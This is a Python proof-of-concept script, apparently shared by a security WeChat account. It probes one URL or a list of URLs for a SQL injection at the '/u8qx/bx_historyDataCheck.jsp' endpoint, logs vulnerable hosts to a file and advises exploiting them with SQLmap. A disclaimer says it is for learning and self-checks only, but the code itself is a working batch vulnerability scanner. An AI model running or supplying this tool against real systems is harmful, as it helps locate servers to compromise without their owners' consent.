# _*_ coding:utf-8 _*_
# @Time : 2023/9/22 19:42
# @Author: 为赋新词强说愁
 
# _*_ coding:utf-8 _*_
# @Time : 2023/8/3 22:30
# @Author: 为赋新词强说愁
 
 
 
import requests
import argparse
from datetime import datetime
import time
requests.packages.urllib3.disable_warnings()
 
RED_BOLD = "\033[1;31m"
RESET = "\033[0m"
def usage():
    global RED_BOLD
    global RESET
    text = '''
    +-----------------------------------------------------------------+
                微信公众号    网络安全透视镜 
    此脚本仅用于学习或系统自检查
    使用方法:
        单个 python3 bx_historyDataCheck-SQL.py -u url[例 http://127.0.0.1:8080]
        批量 python3 bx_historyDataCheck-SQL.py -f filename
    +-----------------------------------------------------------------+         
 
    根据《中华人民共和国刑法》规定，违反国家规定，对计算机信息系统功能进行\n删除、修改、增加、干扰，造成计算机信息系统不能正常运行的，处五年以下有期徒刑\n或者拘役；后果特别严重的，处五年以上有期徒刑。
    违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行\n删除、修改、增加的操作，后果严重的，依照前款的规定处罚。
    开始检测................................
    '''
    print(f"{RED_BOLD}{text}{RESET}")
 
 
# proxies = {'http':'http://127.0.0.1:10808}
 
def exp(url):
 
 
      pass
 
def save_file(url):
    with open('result.txt',mode='a',encoding='utf-8') as f:
        f.write(url+'\n')
 
def poc(check_url,flag):
    now_poc = datetime.now()
    global RED_BOLD
    global RESET
    url = check_url + "/u8qx/bx_historyDataCheck.jsp"
    # Define the headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
 
    # Define the POST data
    data = {
        'userName': '1'
    }
 
    try:
        response = requests.post(url, headers=headers, data=data, timeout=4, verify=False)
        content = response.text.strip()
        #print(content)
        # Check the response
 
        if response.status_code == 200 and content == "0":
            print(f'{RED_BOLD}[+]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url} 漏洞存在,请使用SQLmap进行漏洞利用{RESET}')
            save_file(check_url)
        else:
            print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url} 漏洞不存在')
    except Exception as e:
        print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url} 无法访问，请检查目标站点是否存在')
 
 
def run(filepath):
    flag = 0
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for u in urls:
        if 'http' in u:
            url = u
        elif 'https' in u:
            url = u
        else:
            url = 'http://' + u
 
        poc(url,flag)
 
 
def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help="python bx_historyDataCheck-SQL.py -u url")
    parse.add_argument("-f", "--file", help="python bx_historyDataCheck-SQL.py -f file")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    usage()
    time.sleep(2)
    if url is not None and filepath is None:
        flag = 1
 
        poc(url,flag)
    elif url is None and filepath is not None:
        run(filepath)
    else:
        usage()
 
 
if __name__ == '__main__':
    main()